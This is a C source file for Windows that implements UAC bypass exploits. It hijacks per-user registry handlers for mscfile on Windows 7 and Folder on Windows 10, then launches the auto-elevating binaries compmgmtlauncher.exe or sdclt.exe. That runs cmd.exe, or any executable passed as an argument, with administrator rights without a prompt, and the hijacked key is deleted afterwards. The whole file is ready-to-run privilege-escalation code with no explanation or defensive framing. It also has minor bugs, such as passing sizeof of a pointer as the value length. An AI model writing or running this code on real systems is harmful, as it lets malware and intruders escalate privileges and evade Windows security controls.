#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <VersionHelpers.h>

#pragma warning(disable : 4996)

int get_os_version();
void bypassUACWindows7(char* pathToExe);
void bypassUACWindows10(char* pathToExe);

DWORD* cmdPIDs;
DWORD* notElevPIDs;

int main(int argc, char* argv[])
{
	char param[256];
	if (argc == 1)
		strcpy(param, "cmd.exe");
	else if (argc == 2)
		strcpy(param, argv[1]);

	int osVer = get_os_version();
	if (osVer == 7)
		bypassUACWindows7(param);
	else if (osVer == 10)
		bypassUACWindows10(param);
}

int get_os_version()
{
	if (IsWindows8OrGreater())
		return 10;
	else if (IsWindows7OrGreater())
		return 7;
}

void bypassUACWindows7(char* pathToExe)
{
	HKEY newVal;
	RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\shell\\open\\command", &newVal);
	RegSetValueA(newVal, NULL, REG_SZ, pathToExe, sizeof(pathToExe));
	RegCloseKey(newVal);

	WinExec("cmd.exe /c start C:\\Windows\\System32\\compmgmtlauncher.exe", SW_NORMAL);

	Sleep(2000);
	RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\shell\\open\\command");
	return;
}

void bypassUACWindows10(char* pathToExe)
{
	HKEY newVal;
	RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\Folder\\shell\\open\\command", &newVal);
	RegSetValueA(newVal, NULL, REG_SZ, pathToExe, sizeof(pathToExe));
	RegSetValueExA(newVal, "DelegateExecute", 0, REG_SZ, (LPBYTE)NULL, 0);
	RegCloseKey(newVal);

	WinExec("cmd.exe /c start %windir%\\system32\\sdclt.exe", SW_NORMAL);

	Sleep(3000);

	RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\Folder\\shell\\open\\command");
	return;
}